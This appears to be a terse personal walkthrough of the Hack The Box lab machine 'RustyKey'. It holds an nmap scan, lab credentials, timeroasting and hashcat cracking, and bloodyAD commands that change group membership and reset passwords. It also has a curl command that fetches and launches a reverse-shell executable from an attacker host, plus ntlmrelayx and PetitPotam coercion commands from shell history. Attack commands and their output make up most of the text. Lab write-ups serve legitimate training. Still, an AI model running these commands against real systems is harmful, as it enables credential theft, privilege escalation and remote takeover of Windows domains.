---
tags:
  - Windows
  - Active_Directory
  - TimeRoasting
  - HTB
---


# Summary


---

10.10.11.75
`rr.parker` : `8#t5HE8L!W3A`

we will start with nmap:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-09 20:57:04Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The `NTLM` authentication is disabled. We need to use kerberos.

We did alot of enumeration like `smb`, `bloodhound`. but found nothing, so i used timeroasting.
```sh
nxc smb "$DC" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"  -k  -M timeroast
# Remove characters before $.
./hashcat.bin -m 31300 -a 0 ~/HTB/windows/hard/RustyKey/timeRoasting_hash.txt  /opt/lists/rockyou.txt
```
we got credentials:  `IT-COMPUTER3` : `Rusty88!`





```sh

# IT-Computer3$ computer
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" add groupMember 'HELPDESK' 'IT-Computer3$'
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" remove groupMember 'Protected Objects' 'IT'
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" remove groupMember 'Protected Objects' 'SUPPORT'
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" set password 'bb.morgan' 'Rusty88!'
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" set password 'ee.reed' 'Rusty88!'

# bb.morgan User
getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD"
evil-winrm-py -i "$IP"  -k --no-pass
```


```
curl http://10.10.15.54/reverse.exe -o reverse.exe
Start-Process -FilePath "reverse.exe"

```



```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  RUSTYKEY
    DefaultUserName               :  Administrator


C:\Users\bb.morgan\AppData\Local\Temp\winrm-upload\tmpzip-47000f8874fc9a52065e415bacb088349df7d115\internal.pdf
C:\Users\bb.morgan\Documents\rustykey\internal.pdf
C:\Users\bb.morgan\Documents\rustykey\rustykey\internal.pdf
C:\Users\bb.morgan\Desktop\internal.pdf

```


```ntlm-reflection
: 1762728656:0;sudo /home/slom/.local/bin/ntlmrelayx.py -t winrms://10.129.201.15 -smb2support -i
: 1762728659:0;nxc smb "$DC" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --dns-server "$IP"  -M coerce_plus -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
: 1762728790:0;nc 127.0.0.1 11000

```